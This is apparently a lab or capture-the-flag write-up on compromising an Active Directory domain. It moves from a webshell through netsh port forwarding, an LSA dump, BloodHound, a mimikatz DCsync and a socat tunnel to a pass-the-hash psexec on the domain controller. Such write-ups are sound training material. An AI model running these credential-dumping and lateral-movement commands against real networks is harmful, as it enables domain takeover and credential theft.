Here we find the web page we need, open SMB ports and an access point for WinRM. For now we visit the webpage, and go to the /uploads directory and log in with the provided credentials. We are here presented with an antak.aspx powershell webshell. From here we can easily find the first flag on the indicated location.

The location of the flag suggests that we already have high privileges, so for the moment we don't need to focus on privilege escalation. Uploading PowerView.ps1 via the UI is very straightforward and we can continue our enumeration.

Since we have access to MS01 we can connect it to a port on the computer hosting the webshell (WEB-WIN01). (We can also find the IP address of MS01 first with nslookup or a ping. This step is not necessary at this point, but can't be skipped altogether.)

Via the webshell we run the following netsh.exe command to connect to MS01. (netsh.exe is a native binary on windows machines, and is therefore slightly stealthier than uploading tools like Ligolo-Ng. In the future I will probably publish a similar writeup including Ligolo-Ng in the process.)

Port forward SMB — MS01 → WEB-WIN01:4455
PS> netsh.exe interface portproxy add v4tov4 listenport=4455 listenaddress=10.129.25.61 connectport=445 connectaddress=MS01

We can now get an LSA dump and find the cleartext password for tpetty. Since we forward port 445 of MS01 to port 4455 on WEB-WIN01 we have to specify the port on which to perform the LSA dump.

Now we can RDP into MS01 (via port 8888 on WIN-WEB01) as svc_sql (tpetty doesn't work) and upload and run SharpHound.exe. Unfortunately Bloodhound-Python does not work because we have to access the system via non-default ports. We open a terminal and run the following command to execute SharpHound.exe.

Collect BloodHound data
C:\Users\svc_sql.INLANEFREIGHT\Desktop>SharpHound.exe -c All

After a few minutes we are left with a .zip that we copy to our attack machine and analyze it with bloodhound.

In bloodhound we see that our user tpetty can perform a DCsync attack (!) and under Windows abuse we find directions to perform this attack:

BloodHound — Windows Abuse You may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:

lsadump::dcsync /domain:testlab.local /user:Administrator

The ultimate goal is to run psexec as administrator on DC01, but this target is not reachable yet. To do that we apply the same netsh.exe method to connect an SMB port over an arbitraty port on WIN-WEB01. In the webshell we run the following command to establish the connection.

Port forward DC01 SMB → WEB-WIN01:4454
netsh.exe interface portproxy add v4tov4 listenport=4454 listenaddress=10.129.17.102 connectport=445 connectaddress=172.16.6.3

This port is a problem for impacket since this is not a default SMB port (139 or 445). Fortunately we have another machine at our disposal: our own attack machine. Using socat we can connect port 4454 on WIN-WEB01 to port 445 of our attack machine.

Socat tunnel — attack machine:445 → WEB-WIN01:4454
╭─[HQ🚀🌐192.168.1.66|10.10.15.28🔥]─(3v3r7@Athena)
╰─>[👾]/home/3v3r7 $ sudo socat -d -d TCP-LISTEN:445,fork TCP:10.129.17.102:4454

We can then attack our own SMB port that forwards the traffic to a port that impacket would normally not allow. We can then use psexec and find the final flag.

PSExec as Administrator on DC01
╭─[HQ🚀🌐192.168.1.66|10.10.15.28🔥]─(3v3r7@Athena)
╰─>[👾]/home/3v3r7 $ psexec.py -hashes :27dedb1dab4d8545c6e1c66fba077da0 administrator@127.0.0.1
